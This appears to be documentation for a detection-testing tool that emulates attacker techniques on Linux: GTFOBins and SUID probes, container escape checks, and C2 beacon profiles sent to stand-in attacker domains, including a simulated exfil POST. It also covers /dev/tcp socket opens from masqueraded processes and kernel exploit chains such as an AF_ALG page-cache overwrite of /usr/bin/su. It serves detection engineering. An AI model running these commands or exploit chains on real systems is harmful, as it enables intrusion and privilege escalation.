Comprehensive read-only probe of 100+ GTFOBins binaries with sudo permission parsing and SUID bit detection. Identifies exploitable privilege escalation vectors without performing actual exploitation.

GTFOBins categories scanned (100+ binaries):

| Category | Example Binaries | Escape Method |
|----------|------------------|---------------|
| Direct shells | ash, bash, sh, zsh, dash, ksh | Direct shell spawn |
| Interactive escape | less, more, man, ftp, psql | !sh / \! command |
| Editor escape | vim, vi, nano, emacs, ed | :shell / !/bin/sh |
| Scripting | python, perl, ruby, php, lua, node | os.system() / exec |
| Text processing | awk, gawk, sed, find, xargs | System/exec calls |
| Environment wrappers | env, nice, nohup, time, timeout | Shell spawn wrapper |
| Package managers | apt, dpkg, pip, gem, npm | Changelog/install escape |
| Compilers | gcc, make, cmake | Wrapper execution |
| Network tools | nmap, socat, wget, curl | Script/write execution |
| Container tools | docker, kubectl, lxc | Container mount escape |
| System utilities | systemctl, journalctl, git | Pager escape (PAGER=) |
| Archive tools | tar, zip, 7z | Checkpoint/action exec |
| Capabilities | setcap, getcap, capsh | Capability manipulation |

How it works:
1. Loads database of 100+ GTFOBins entries with escape methods
2. Scans /usr/bin, /usr/sbin, /bin, /sbin, /usr/local/bin for installed binaries
3. Parses sudo -l -n output to identify sudo-allowed commands
4. Detects SUID binaries via find -perm -4000 in each directory
5. Cross-references installed binaries against GTFOBins database
6. Reports exploitable vectors with escape commands (does NOT execute)
7. Generates comprehensive report with severity assessment

Commands executed:
```bash
sudo -l -n                                    # Parse sudo permissions
find /usr/bin -perm -4000 -type f            # Find SUID binaries
find /usr/sbin -perm -4000 -type f
find /bin -perm -4000 -type f
find /sbin -perm -4000 -type f
find /usr/local/bin -perm -4000 -type f
```

Parameters:
- `artefact_path`: Path to save probe results (default: /tmp/signalbench_gtfobins_probe.txt)
- `check_sudo`: Whether to check sudo permissions (default: true)
- `check_suid`: Whether to scan for SUID binaries (default: true)

Artefacts:
- GTFOBins probe results file (cleaned up automatically)

Detection opportunities:
- sudo -l enumeration attempts
- find commands with -perm -4000 (SUID search)
- Sequential stat/access to multiple system binaries
- Pattern of privilege escalation reconnaissance
- Reading of /etc/sudoers or sudo cache
- File creation containing escalation findings

## CONTAINER ESCAPE - Advanced Breakout Techniques

### T1611-BREAKOUT - Advanced Container Breakout Vectors

**Attribution:** Based on deepce, Unit42 research, LinPEAS, and CDK container exploitation toolkit

Description:  
READ-ONLY analysis of kernel-level container breakout vectors. Probes core_pattern, binfmt_misc handlers, uevent_helper, and related kernel parameters for escape potential. Uses permission checks (stat) to detect writability without modification.

How it works:
1. Core Pattern Analysis:
   - Reads /proc/sys/kernel/core_pattern to check core dump handling
   - Detects pipe handlers (|/path/to/handler) that could enable code execution
   - Checks write permissions via stat() without modifying
   - Queries sysctl kernel.core_pattern for verification
2. Binfmt_misc Analysis:
   - Checks if /proc/sys/fs/binfmt_misc is mounted
   - Reads /proc/sys/fs/binfmt_misc/status
   - Checks register file permissions for handler injection potential
   - Lists existing handlers via ls -la
3. Uevent Helper Analysis:
   - Reads /sys/kernel/uevent_helper content
   - Checks permissions for potential exploitation
4. Additional Kernel Vectors:
   - Reads /proc/sys/kernel/modprobe (module loader path)
   - Reads /proc/sys/kernel/hotplug (hotplug helper)
   - Reads /proc/sys/kernel/sysrq (magic SysRq status)

Commands executed:
```bash
cat /proc/sys/kernel/core_pattern
sysctl kernel.core_pattern
ls -la /proc/sys/fs/binfmt_misc
cat /proc/sys/fs/binfmt_misc/status
cat /sys/kernel/uevent_helper
cat /proc/sys/kernel/modprobe
cat /proc/sys/kernel/hotplug
cat /proc/sys/kernel/sysrq
```

Parameters:
- `output_dir`: Directory for output files (default: /tmp/signalbench_breakout)
- `test_core_pattern`: Analyse core_pattern configuration (default: true)
- `test_binfmt`: Analyse binfmt_misc handlers (default: true)
- `test_uevent`: Analyse uevent_helper settings (default: true)

Artefacts:
- Breakout analysis report (cleaned up automatically)

Detection opportunities:
- Reads of /proc/sys/kernel/core_pattern
- sysctl queries for kernel.core_pattern
- Directory listing of /proc/sys/fs/binfmt_misc
- Access to /sys/kernel/uevent_helper
- Reads of kernel modprobe/hotplug paths
- CAP_SYS_ADMIN capability checks
- Stat calls on kernel tunable paths

### T1611-CVE - Container Runtime CVE Checks

**Attribution:** Based on LinPEAS, Traitor, and deepce vulnerability checks

Description:  
Checks for known container runtime vulnerabilities including CVE-2019-5736 (runc /proc/self/exe overwrite), CVE-2020-15257 (containerd abstract socket hijacking), CVE-2022-0847 (Dirty Pipe), and CVE-2016-5195 (Dirty COW). Performs version detection and vulnerability assessment without exploitation.

CVEs checked:

| CVE | Component | Vulnerable Versions | Description |
|-----|-----------|---------------------|-------------|
| CVE-2019-5736 | runc | < 1.0.0-rc6 | Container escape via /proc/self/exe overwrite |
| CVE-2020-15257 | containerd | < 1.3.9, 1.4.x < 1.4.3 | Abstract socket hijacking escape |
| CVE-2022-0847 | Kernel | 5.8 - 5.16.11 | Dirty Pipe arbitrary file overwrite |
| CVE-2016-5195 | Kernel | < 4.8.3 | Dirty COW copy-on-write race condition |

How it works:
1. Checks runc version at /usr/bin/runc, /usr/sbin/runc, /usr/local/bin/runc
2. Parses version to detect CVE-2019-5736 vulnerable versions
3. Checks containerd version for CVE-2020-15257
4. Parses kernel version for Dirty Pipe and Dirty COW vulnerabilities
5. Queries Docker daemon version
6. Reports [VULNERABLE] or [SAFE] status for each component
7. Generates comprehensive vulnerability report

Commands executed:
```bash
runc --version
containerd --version
uname -r
cat /proc/version
docker version --format "{{.Server.Version}}"
```

Parameters:
- `output_dir`: Directory for output files (default: /tmp/signalbench_cve)

Artefacts:
- CVE check results log (cleaned up automatically)

Detection opportunities:
- Version enumeration commands (runc --version, containerd --version)
- Kernel version enumeration (uname -r, /proc/version access)
- Docker daemon queries
- Sequential runtime version checks
- CVE reconnaissance patterns

### T1611-NS - Namespace Escape Detection

Description:  
Probes Linux namespace isolation boundaries to detect shared namespaces between container and host. Compares namespace inodes between current process and init (PID 1) to identify escape vectors.

Namespaces checked:
- cgroup - Control group namespace
- ipc - Inter-process communication namespace
- mnt - Mount namespace (most critical for escape)
- net - Network namespace
- pid - Process ID namespace
- user - User namespace
- uts - UTS (hostname) namespace

How it works:
1. Reads namespace symlinks from /proc/self/ns/* for current process
2. Reads namespace symlinks from /proc/1/ns/* for init (PID 1)
3. Extracts and compares inode numbers from symlink targets
4. Identifies shared namespaces (same inode = shared with host)
5. If PID namespace shared, attempts nsenter to demonstrate access
6. Lists namespace details via ls -la
7. Reports escape vectors based on shared namespaces

Commands executed:
```bash
readlink /proc/self/ns/{cgroup,ipc,mnt,net,pid,user,uts}
readlink /proc/1/ns/{cgroup,ipc,mnt,net,pid,user,uts}
ls -la /proc/self/ns
nsenter --target 1 --pid -- ps aux   # If PID namespace shared
```

Parameters:
- `output_dir`: Directory for output files (default: /tmp/signalbench_ns)

Artefacts:
- Namespace enumeration results (cleaned up automatically)
- Host process list if escape succeeds (cleaned up automatically)

Detection opportunities:
- Reading /proc/self/ns/* and /proc/1/ns/* symlinks
- Namespace inode comparisons
- nsenter execution targeting PID 1
- ls commands on /proc/self/ns directory
- Capability enumeration for namespace operations

## COMMAND AND CONTROL - IOC-Based Detection

### T1071-IOC - Suspicious Domain Connections

**Attribution:** Based on ttp-bench IOC patterns and threat intelligence feeds

Description:  
Connects to known malicious and suspicious domains across four phases to generate C2-like network telemetry. Phase 1 sends HTTP requests profiled to match nine C2 frameworks: PoshC2 (10 binary-variant POSTs with SessionID= cookie), Sliver (19-request session with IE11 User-Agent, mixing Snort-rule-targeted prefixed paths with numeric nonces and Razy-coverage un-prefixed paths with hex nonces), Cobalt Strike (6 HTTP patterns covering Snort sids 63772/65446/300048/54175/54182/56616 plus the /track Razy beacon), AdaptixC2 BEACON (4 POSTs to /uri.php and /endpoint/api with X-Beacon-Id / X-App-Id headers and size-prefixed RC4 bodies), PowerShell Empire (4-request lifecycle: /launcher stager pull, then STAGE1 / RESULT_POST / TASKING_REQUEST beacons with RoutingPacket session cookies), Mythic Apollo (3-request lifecycle: encrypted-blob checkin POST, JhY3Rpb24iOi= URI literal GET, encrypted-blob post_response POST), Havoc (3-request DEADBEEF/B16B00B5 sequence), BabyShark (nasbench /momyshark route), and standard framework probes including web shell patterns. Phase 2 runs full Stratum v1 cryptocurrency mining sessions against pool.signalbench-mining.com and stratum.signalbench-crypto.net on ports 3333 and 4444, maintaining at least 5 seconds of bidirectional dwell per connection so Palo Alto App-ID classifies each session as stratum-mining. Phase 3 opens a TLS 1.2 connection to the sinkhole on port 8888; the sinkhole presents a certificate with CN=AsyncRAT Server, triggering the AsyncRAT Snort rule on TLS handshake inspection (TLS 1.2 is required because TLS 1.3 encrypts the Certificate message). Phase 4 sends raw UDP/53 probes to the sinkhole IP: a 78-byte dnscat2 tunnel-init packet and two 27-byte Cobalt Strike DNS beacon packets (QTYPE A and TXT).

Domains and IPs tested:

| Target | Category |
|--------|----------|
| signalbench-c2-test.tk | Suspicious TLD (.tk) |
| signalbench-malware.ru | Suspicious TLD (.ru) / Cobalt Strike HTTP profiles |
| signalbench-backdoor.cn | Suspicious TLD (.cn) / PoshC2 profiles |
| signalbench-rat.xyz | Suspicious TLD (.xyz) / Sliver HTTP profiles |
| signalbench-payload.top | Suspicious TLD (.top) |
| xk8f2m9p3q.t1071.signalbench.sigre.xyz | DGA-like pattern |
| a1b2c3d4e5f6.t1071.signalbench.sigre.xyz | DGA-like pattern |
| q9w8e7r6t5.t1071.signalbench.sigre.xyz | DGA-like pattern |
| update.signalbench-services.com | Update masquerading |
| cdn.signalbench-delivery.net | CDN masquerading |
| api.signalbench-auth.io | API masquerading / BabyShark and dnscat2 HTTP profiles |
| 192.0.2.1 | TEST-NET-1 IP (RFC 5737) |
| 198.51.100.1 | TEST-NET-2 IP (RFC 5737) |
| 203.0.113.1 | TEST-NET-3 IP (RFC 5737) |
| signalbench.onion.link | Tor proxy pattern |
| pool.signalbench-mining.com | Mining pool pattern (Stratum Phase 2) |
| stratum.signalbench-crypto.net | Stratum protocol pattern (Stratum Phase 2) |
| signalbench-mythic.pw | Mythic Apollo C2 pattern (.pw TLD) |
| signalbench-havoc.cc | Havoc C2 pattern (.cc TLD) |
| signalbench-empire.net | PowerShell Empire C2 listener (.net masquerade) |

Domain classification:

Domains are split into two categories. Safe domains are always tested without prerequisites. Unowned domains require /etc/hosts configuration or root privileges to add it automatically.

- Safe: *.sigre.xyz (GoCortex-owned; DNS resolves without host entries)
- Safe: TEST-NET IP addresses 192.0.2.1, 198.51.100.1, 203.0.113.1 (RFC 5737)
- Unowned: signalbench-c2-test.tk, signalbench-malware.ru, signalbench-backdoor.cn, signalbench-rat.xyz, signalbench-payload.top, signalbench-empire.net, update.signalbench-services.com, cdn.signalbench-delivery.net, api.signalbench-auth.io, signalbench.onion.link, pool.signalbench-mining.com, stratum.signalbench-crypto.net, signalbench-mythic.pw, signalbench-havoc.cc

How it works (root mode):

1. Detects root privileges via geteuid()
2. Reads /etc/hosts and checks for an existing SIGNALBENCH-T1071-IOC-START marker
3. If not present, resolves the sinkhole IP from `sinkhole.signalbench.sigre.xyz` (fallback `203.0.113.1`) then builds a marker block mapping all 14 unowned domains to that IP
4. Writes the block atomically: writes to /etc/.hosts.signalbench.{pid}, then renames over /etc/hosts
5. Creates /tmp/.signalbench_t1071_hosts_modified to record that the file was changed
6. Tests all 19 targets via curl and dig
7. On cleanup, reads /etc/hosts and verifies both START and END markers are present
8. If one marker is missing (malformed block), cleanup aborts and prints a manual intervention warning
9. If both markers are present, strips the marker block atomically and removes the marker file

How it works (non-root mode):

1. For each unowned domain, calls getent hosts to check whether it resolves to the runtime-resolved sinkhole IP (from `sinkhole.signalbench.sigre.xyz`, fallback `203.0.113.1`)
2. Domains that do not resolve to that IP are skipped; a [WARN] block lists them with manual /etc/hosts instructions
3. Safe domains and any unowned domains already present in /etc/hosts are tested normally
4. /etc/hosts is not modified; no marker file is created

Common steps (both modes):

1. Displays target table to console before testing
2. For each tested target, attempts HTTP connection via curl to generate network telemetry
3. Performs DNS lookup via dig for additional telemetry
4. Logs results per target: HTTP code, timing, resolved IP, DNS response
5. Prints per-target [OK] / [--] / [FAIL] / [WARN] status to console
6. Prints summary on completion: attempted, successful, failed, skipped

Commands executed (Phase 1):
```bash
getent hosts {domain}
curl -s -o /dev/null -w "%{http_code},%{time_total},%{remote_ip}" --max-time 3 --connect-timeout 3 http://{target}
dig +short +time=1 +tries=1 {target}
```

Phase 1 also dispatches framework-specific request sequences for each of the nine C2 profiles:

- PoshC2: 10 POST requests to /news.php with `Cookie: SessionID=<base64url(variant[:16])>` and `Content-Type: application/octet-stream`; 40-byte binary bodies from the POSHC2_VARIANTS constant
- Sliver: 19 requests to signalbench-rat.xyz using `Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko` User-Agent and `Accept-Language: en-US`.  Split into three sub-sets: (a) 8 requests targeting Snort sids 57675-57682 with prefixed paths (e.g. `/static/robots.txt`, `/wordpress/login.php`) and numeric `?_=[0-9]{1,9}` nonces; (b) 3 framework-extension variants (.woff stager, .html key exchange, .png close session); (c) 8 Razy-coverage requests with the un-prefixed pre-Plan-D URI set (`/robots.txt`, `/wp/in.php`, `/api.php`, etc.) and hex `?_=<16hex>` nonces.  All POSTs carry no Content-Type and no body
- Cobalt Strike: GET /get with `Cookie: auth_tokenAB01=<32 uppercase chars>`; GET /oscp/beacon with Chrome/88 UA and no Accept-Encoding; POST /submit.php?id=1 with 4-byte LE length prefix and binary body; GET /mPlayer; GET then POST /compatible?id=<uuid> with `data=<b64>&from=0` body; POST /track with `{"locale":"en","channel":"prod","addon":"<uuid>","cli":"<val>","l-<val>":"<val>"}` body (the `/track` JSON also fires the PAN Razy C2 sig)
- AdaptixC2 BEACON: 4 POSTs to signalbench-payload.top (default `/uri.php` with `X-Beacon-Id` header + Firefox 20 UA + `Mozilla/5.0 (Windows NT 6.2; rv:20.0) Gecko/20121202 Firefox/20.0`; observed `/endpoint/api` with `X-App-Id` header + Chrome 121 UA), body `[4-byte LE size][N-byte RC4 ciphertext][16-byte RC4 key]`
- Empire: 4-request lifecycle to signalbench-empire.net with IE11 Trident/7.0 UA: GET /launcher (stager), GET /admin/get.php (STAGE1), POST /login/process.php (RESULT_POST), GET /news.php (TASKING_REQUEST).  Session cookie value is base64 of Empire 5 RoutingPacket: 12-byte nonce + 32-byte ChaCha20-Poly1305 block + optional encData
- Mythic Apollo: 3-request lifecycle to signalbench-mythic.pw with `Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko` UA: POST /data checkin (body = base64(UUID + IV(16) + ciphertext(240) + HMAC-SHA256(32))); GET /index?q=JhY3Rpb24iOi=<base64(uuid+plaintext-JSON)> for the Snort sid:63316 URI literal match; POST /data post_response (encrypted-blob shape)
- Havoc: GET `/js/jquery-3.6.4.min.js?id=<rand>&hash=<rand>` with `Server: Apache` request header; POST `/Collectors/3.0/settings/mail/` with `DE AD BE EF` at bytes 4-7 and `00 00 00 20` at bytes 8-11; POST `/<rand>` with `B1 6B 00 B5` at bytes 4-7
- BabyShark: GET `/momyshark?key=b4bysh4rk` with `Chrome/70.0.3538.77` User-Agent; follow-up POST with pipe-delimited exfil payload to api.signalbench-auth.io
- dnscat2 HTTP tunnel: POST requests to api.signalbench-auth.io with `Go-http-client/1.1` User-Agent and `X-Session-ID` header

A 2-second sleep is applied after each multi-request sequence to allow the PA-440 to age out each session before the next profile begins.

Confirmed PAN PA-440 detections from this profile set: Cobalt Strike Beacon C2, Razy C2,
AdaptixC2 C2, Havoc Framework C2, AsyncRAT C2, Generic Cryptominer, CobaltStrike.Gen DNS.
Sliver, Mythic Apollo, and Empire PAN signatures appear to require HTTPS layer presence
and Go/C#-specific JA3 fingerprints; they do not fire on plain HTTP traffic generated
from Python stdlib or the Rust binary's plain-HTTP path.

Phase 2: Stratum Protocol Simulation

After Phase 1 completes, the technique opens direct TCP connections to pool.signalbench-mining.com and stratum.signalbench-crypto.net on ports 3333 and 4444. Each connection runs a full Stratum v1 exchange that generates bidirectional JSON-RPC traffic for at least 5 seconds.

Exchange sequence per connection:

1. Client sends mining.subscribe; server responds with subscribe result, mining.set_difficulty, and mining.notify (job sb00); client extracts job_id from the notify
2. Client sends mining.authorize; server responds with authorize result, updated mining.set_difficulty, mining.notify (job sb01), and a client.get_version request; client sends client.get_version response
3. Four submit rounds, each ~1 second apart:
   - Client sends mining.submit with the current job_id and an incrementing nonce
   - Server responds with accepted result and a new mining.notify (sb02, sb03, sb04, sb05)
   - Client updates job_id from the notify; if no notify is received, synthesises the next expected job_id
4. Client sends mining.ping; server responds with mining.pong
5. A top-up sleep is applied if total elapsed time is under 5 seconds

Phase 2 uses direct TCP connections implemented in Rust; no shell commands are invoked. Both refused and timed-out connections still generate telemetry because a TCP SYN is sent regardless of outcome.

Phase 3: AsyncRAT TLS Handshake

After Phase 2 completes, the technique opens a TLS connection to the sinkhole on port 8888. The sinkhole presents a pre-generated self-signed certificate with CN=AsyncRAT Server. The TLS handshake is sufficient to trigger the AsyncRAT Snort rule, which fires on the server certificate CN during SSL negotiation inspection.

Commands executed (Phase 3):
```bash
openssl s_client -connect <sinkhole_ip>:8888 -brief -servername asyncrat.signalbench.local </dev/null
```

Phase 4: Raw DNS Probes

After Phase 3, two sets of raw UDP packets are sent directly to the sinkhole IP on port 53 using a Tokio UDP socket. No shell commands are invoked and no response is expected; the outbound UDP packet is the telemetry event.

1. dnscat2 tunnel-init packet (78 bytes): Transaction ID `00 01`, flags `01 00` (standard query, RD=1), one question with a label containing `!command` at byte 18 of the QNAME. Targets the snort3-malware-cnc.rules MALWARE-CNC dnscat2 DNS tunnelling channel initialisation rule.

2. Cobalt Strike DNS beacons (27 bytes each): QNAME label `\x03aaa\x05stage\x00`. Sent twice: QTYPE 0x0001 (A record, sid:45906) then QTYPE 0x0010 (TXT record, sid:45907). Targets snort3-malware-cnc.rules MALWARE-CNC CobaltStrike DNS Beacon outbound rules.

Parameters:
- `log_file`: Path to save connection log (default: /tmp/signalbench_suspicious_domains.log)
- `timeout`: Connection timeout in seconds (default: 3)

Artefacts:
- Connection attempt log at the configured log_file path (cleaned up automatically)
- /tmp/.signalbench_t1071_hosts_modified (root mode only; removed on cleanup)

Detection opportunities:
- DNS queries to suspicious TLDs (.tk, .ru, .cn, .xyz, .top, .pw, .cc)
- Connections to known malicious infrastructure patterns
- High-entropy domain name patterns (DGA detection)
- Beaconing behaviour patterns
- PoshC2: `Cookie: SessionID=` header with binary POST body (snort3-malware-cnc.rules)
- Sliver: IE11 User-Agent (`Trident/7.0; rv:11.0`) with `?_=<hex>` URI suffix (snort3-malware-other.rules)
- Cobalt Strike HTTP: auth_token cookie pattern, /oscp/ URI, binary /submit.php?id= POST, /mPlayer URI, /compatible?id= check-in sequence, /track JSON body with cli and l- keys (snort3-malware-cnc.rules sids 63772/65446/300048/54175/54182/56616)
- Mythic: `JhY3Rpb24iOi` base64 URI parameter; decoded value contains UUID dashes at fixed offsets and a JSON open brace (snort3-malware-cnc.rules)
- Havoc: jquery-masquerade GET with `Server: Apache` in the request; DEADBEEF and B16B00B5 magic bytes at offset 4 of POST body (snort3-malware-cnc.rules)
- BabyShark: /momyshark route with Chrome/70 User-Agent (indicator-based; no dedicated Snort rule)
- Mining pool connection patterns (pool.*, stratum.*)
- Stratum JSON-RPC exchange over TCP 3333/4444 (mining.subscribe, mining.authorize, mining.submit, mining.ping); classified by Palo Alto App-ID as stratum-mining
- Tor proxy patterns (.onion.link)
- AsyncRAT TLS: server certificate CN=AsyncRAT Server on TLS handshake (snort3-malware-cnc.rules; flow:to_client,established; service:ssl)
- dnscat2 DNS: raw UDP/53 with `!command` bytes at QNAME offset 18 (snort3-malware-cnc.rules)
- Cobalt Strike DNS: QTYPE A and TXT beacons with aaa.stage QNAME label (snort3-malware-cnc.rules sids 45906/45907)
- Connections to TEST-NET IP ranges
- CDN/API masquerading domain patterns

## DEFENSE EVASION - Process Manipulation

### T1036-PROC - Process Name Masquerading

Description:  
Changes process name at runtime using prctl(PR_SET_NAME) to mimic legitimate system processes like [kworker], [migration], sshd, or systemd. Each spawned masqueraded child performs activity that a real kernel worker or system daemon would not - writing to a user-path stage file and opening a TCP socket - so the detection signal goes beyond a spoofed ps row.

How it works:
1. Records original process name from /proc/self/comm
2. Uses prctl(PR_SET_NAME) to change the main process name
3. Writes directly to /proc/self/comm as an alternative method
4. Spawns a bash helper script that renames itself, then forks four subshell children renamed to `kworker`, `apache2`, `sshd`, and `crond`. Each child writes a stage file at `/tmp/.cache-masq-<name>` and attempts a TCP connect to the sinkhole via bash `/dev/tcp/<sinkhole>/80`. A real `[kworker]` thread does not open user-space sockets or write to user paths - this is the strong behavioural signal.
5. Restores the original process name after demonstration
6. Generates telemetry for process monitoring detection

Parameters:
- `log_file`: Path to save masquerading log
- `target_name`: Process name to masquerade as (default: [kworker/0:1])

Artefacts:
- Masquerading log file (cleaned up automatically)
- Stage files at `/tmp/.cache-masq-{kworker,apache2,sshd,crond}` (cleaned up automatically)
- Helper script at `/tmp/signalbench_masq_child.sh` (cleaned up automatically)

Detection opportunities:
- prctl syscalls with PR_SET_NAME
- Writes to /proc/self/comm
- Mismatched process names vs executable paths
- Kernel thread names from userspace processes
- Comm field changes in process accounting
- Processes appearing as `[kworker]`, `sshd`, or `crond` writing to user paths or opening outbound TCP sockets (kernel workers never do this)

### T1070.004-SELF - Self-Deleting Binary Pattern

**Attribution:** Based on ttp-bench evasion techniques

Description:  
Demonstrates the self-deleting binary evasion technique where a running process unlinks its own executable from disk, leaving only the in-memory image. This is a common malware technique to evade forensic analysis.

How it works:
1. Creates test shell script that deletes itself while running
2. Monitors /proc/self/exe for "(deleted)" indicator
3. Compiles C program that calls unlink() on argv[0]
4. Demonstrates continued execution after self-deletion
5. Records process state before and after deletion
6. Generates telemetry for forensic detection

Parameters:
- `log_file`: Path to save execution log
- `work_dir`: Working directory for test binaries

Artefacts:
- Test binaries and scripts (cleaned up automatically)
- Marker files showing deletion status (cleaned up automatically)

Detection opportunities:
- unlink syscalls on /proc/self/exe paths
- Processes with "(deleted)" in exe link
- File deletions immediately after execution
- Missing executable files for running processes
- Process execution from memory without disk backing

---

## PRIVILEGE ESCALATION - Kernel CVE Exploits

### T1068.001 - CVE-2024-1086 Nftables Exploit

Description:
Executes the CVE-2024-1086 nftables exploit pattern, targeting a double-free vulnerability in the Linux kernel netfilter subsystem. Creates user namespaces and manipulates nftables rules with specific verdict patterns.

How it works:
1. Creates user namespace via unshare --user (if available)
2. Initialises nftables table (signalbench_exploit_table)
3. Creates chain with base hook configuration
4. Adds rules with verdict patterns (accept, drop, reject, queue)
5. Performs rapid rule creation/deletion cycles to trigger memory patterns
6. Executes fork operations mimicking exploit behaviour
7. Writes a recognisable PoC artefact at `/tmp/cve-2024-1086-poc-<pid>.c` containing a fragment with the CVE ID, characteristic kernel API references (`nft_setelem_catchall`, `nf_tables`), and a published-reference comment. Holds the file for 2 seconds so file-content scanners can register it, then removes it (or retains it under `--no-cleanup`).
8. Complete cleanup removes all nftables rules and tables

Commands executed:
```bash
unshare --user --map-root-user /bin/true
nft add table ip signalbench_exploit_table
nft add chain ip signalbench_exploit_table exploit_chain { type filter hook input priority 0 \; }
nft add rule ip signalbench_exploit_table exploit_chain accept
nft delete table ip signalbench_exploit_table
```

Parameters:
- `output_dir`: Directory for logs and artefacts
- `rule_iterations`: Number of rule manipulation cycles (default: 50)
- `fork_attempts`: Number of fork operations (default: 10)

Verification phase:
- Uses shared `verify_command` helper to run `/bin/sh -c "id -u"` after the exploit chain completes. The shell wrap places the verification under a sh -> id process tree rather than signalbench -> id, matching the post-exploitation lineage real tooling produces.
- Logs `[CVE-2024-1086] [VERIFIED] id ok: 0` when privilege escalation is achieved
- On success, additionally logs `[CVE-2024-1086] [CRITICAL] Privilege escalation VERIFIED: id ok: 0`
- Logs `[CVE-2024-1086] [UNVERIFIED] <reason>` on a patched kernel (expected outcome)
- Verification is always attempted; force mode does not skip it

Detection opportunities:
- User namespace creation (unshare syscalls)
- Rapid nftables rule manipulation
- Netfilter verdict pattern sequences
- Process forking patterns during rule manipulation
- nft command execution with specific table names
- A `/bin/sh -c "id -u"` invocation immediately after the exploit chain (post-exploit EUID check under a shell parent)
- File write to `/tmp/cve-2024-1086-poc-*.c` containing CVE-keyed PoC content (file reputation and AV file scanners)

### T1068.002 - CVE-2025-38352 POSIX CPU Timer Race

Description:
Executes the CVE-2025-38352 POSIX CPU timer race condition exploit pattern. Creates CPU timers, forks child processes, and attempts timer deletion race conditions targeting use-after-free behaviour.

How it works:
1. Creates and compiles C program using timer_create syscall
2. Spawns configurable number of child processes
3. Each child creates CLOCK_PROCESS_CPUTIME_ID timer
4. Attempts timer deletion race via rapid timer_delete calls
5. Uses ptrace operations for process tracing (optional)
6. Simulates signalfd for timer signal handling
7. Writes a recognisable PoC artefact at `/tmp/cve-2025-38352-poc-<pid>.c` containing a fragment with the CVE ID, the affected kernel path (`kernel/time/posix-cpu-timers.c`), and characteristic API references (`timer_create`, `SIGEV_THREAD_ID`, `tgkill`). Holds the file for 2 seconds, then removes it (or retains under `--no-cleanup`).
8. Complete cleanup kills child processes and removes temp files

Commands executed:
```bash
gcc -o timer_race timer_race.c -lrt
./timer_race
strace -e timer_create,timer_delete,fork ./timer_race
```

Parameters:
- `output_dir`: Directory for logs and compiled binaries
- `child_count`: Number of child processes to spawn (default: 5)
- `race_iterations`: Number of race attempts (default: 100)
- `use_ptrace`: Enable ptrace operations (default: true)

Verification phase:
- Uses shared `verify_command` helper to run `/bin/sh -c "id -u"` after the exploit chain completes. The shell wrap places the verification under a sh -> id process tree rather than signalbench -> id.
- Logs `[CVE-2025-38352] [VERIFIED] id ok: 0` when privilege escalation is achieved
- On success, additionally logs `[CVE-2025-38352] [CRITICAL] Privilege escalation VERIFIED: id ok: 0`
- Logs `[CVE-2025-38352] [UNVERIFIED] <reason>` on a patched kernel (expected outcome)
- Verification is always attempted; force mode does not skip it

Detection opportunities:
- timer_create/timer_delete syscalls
- Rapid process forking patterns
- ptrace attachments to child processes
- signalfd creation for timer signals
- C compilation followed by immediate execution
- A `/bin/sh -c "id -u"` invocation immediately after the exploit chain (post-exploit EUID check under a shell parent)
- File write to `/tmp/cve-2025-38352-poc-*.c` containing CVE-keyed PoC content

### T1068.003 - CVE-2025-40190 Ext4 Xattr Underflow

Description:
Executes the CVE-2025-40190 ext4 extended attribute underflow exploit pattern. Manipulates extended attributes on test files to trigger refcount underflow conditions in the ext4 filesystem.

How it works:
1. Creates test files in /tmp/signalbench_xattr_test/
2. Sets extended attributes using setfattr with specific patterns
3. Performs rapid xattr set/get cycles to manipulate refcounts
4. Uses getfattr to read back and verify attribute states
5. Attempts attribute deletion and recreation sequences
6. Writes a recognisable PoC artefact at `/tmp/cve-2025-40190-poc-<pid>.c` containing a fragment with the CVE ID, the affected kernel path (`fs/ext4/xattr.c`), and the characteristic `EXT4_XATTR_PAD` underflow trigger constants. Holds the file for 2 seconds, then removes it (or retains under `--no-cleanup`).
7. Complete cleanup removes all test files and attributes

Commands executed:
```bash
setfattr -n user.signalbench.test -v "exploit_pattern_data" /tmp/test_file
setfattr -n trusted.overlay.opaque -v "y" /tmp/test_file
getfattr -n user.signalbench.test /tmp/test_file
setfattr -x user.signalbench.test /tmp/test_file
```

Parameters:
- `output_dir`: Directory for test files
- `test_file_count`: Number of test files to create (default: 5)
- `xattr_iterations`: Number of xattr manipulation cycles (default: 50)

Verification phase:
- Uses shared `verify_command` helper to run `/bin/sh -c "id -u"` after the exploit chain completes. The shell wrap places the verification under a sh -> id process tree rather than signalbench -> id.
- Logs `[CVE-2025-40190] [VERIFIED] id ok: 0` when privilege escalation is achieved
- On success, additionally logs `[CVE-2025-40190] [CRITICAL] Privilege escalation VERIFIED: id ok: 0`
- Logs `[CVE-2025-40190] [UNVERIFIED] <reason>` on a patched kernel (expected outcome)
- Verification is always attempted; force mode does not skip it

Detection opportunities:
- setfattr/getfattr command execution
- Extended attribute syscalls (setxattr, getxattr, removexattr)
- Rapid filesystem metadata operations
- Trusted namespace xattr manipulation
- File operations in temporary directories
- A `/bin/sh -c "id -u"` invocation immediately after the exploit chain (post-exploit EUID check under a shell parent)
- File write to `/tmp/cve-2025-40190-poc-*.c` containing CVE-keyed PoC content

### T1068.004 - CVE-2026-31431 Copy Fail

Description:
Executes the CVE-2026-31431 AF_ALG + splice + recv syscall chain against /usr/bin/su (Phase 1),
then writes the original copy.fail/exp proof-of-concept script to /tmp as a non-executed file
artefact and deletes it (Phase 2). The two phases are complementary detection surfaces and both
run from a single `signalbench run T1068.004` invocation.

A logic flaw in algif_aead.c causes page-cache pages delivered via splice() to land in the
writable AEAD destination scatterlist; the authencesn scratch write overwrites 4 controlled bytes
in the kernel's cached copy of the target file without touching on-disk data.

Safety contract: counter-pattern payload only (no shellcode), no execve, posix_fadvise(DONTNEED)
eviction after every chunk. The Phase 2 file is never executed.

How it works:

Phase 1 - AF_ALG syscall chain (37-chunk loop):

1. Target file preparation:
   - open(/usr/bin/su, O_RDONLY) and fstat to confirm SUID flag
   - read(first 4096 bytes) to warm the page cache

2. Per-chunk loop (37 iterations x 4 bytes = 148-byte counter-pattern payload):
   For each 4-byte chunk, a fresh AF_ALG socket is created and the full chain runs:
   - socket(AF_ALG, SOCK_SEQPACKET, 0)
   - bind() with authencesn(hmac(sha256),cbc(aes)) AEAD algorithm
   - setsockopt(SOL_ALG, ALG_SET_KEY) with COPY_FAIL_KEY: 40-byte
     crypto_authenc_key_param netlink attribute header
     (08 00 01 00 00 00 00 10 = nla_len=8, nla_type=1, enckeylen=16)
